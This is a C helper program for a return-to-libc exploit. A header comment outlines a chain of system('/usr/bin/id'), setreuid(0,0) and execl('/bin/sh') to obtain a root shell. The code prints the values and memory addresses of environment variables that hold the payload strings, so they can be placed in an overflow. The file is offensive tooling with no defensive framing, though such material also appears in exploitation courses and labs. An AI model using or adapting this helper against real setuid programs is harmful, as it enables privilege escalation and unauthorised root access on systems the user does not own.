/*User Return-to-libc to execute 
system("/usr/bin/id");
setreuid(0,0);
system("id");
execl("/bin/sh","sh",NULL);
*/
#include <stdio.h>
#include <stdlib.h>
int main()
{
	char *shell=(char*)getenv("MYUID");
	if(shell)
	{
		printf("Value: %s\n",shell);
		printf("Address: %x\n",(unsigned int)shell);
	}
	char *shell2=(char*)getenv("MYID");
	if(shell2)
	{
		printf("Value: %s\n",shell2);
		printf("Address: %x\n",(unsigned int)shell2);
	}
	char *shell3=(char*)getenv("MYBSH");
	if(shell3)
	{
		printf("Value: %s\n",shell3);
		printf("Address: %x\n",(unsigned int)shell3);
	}
	char *shell4=(char*)getenv("MYSH");
	if(shell4)
	{
		printf("Value: %s\n",shell4);
		printf("Address: %x\n",(unsigned int)shell4);
	}
	return 1;
}
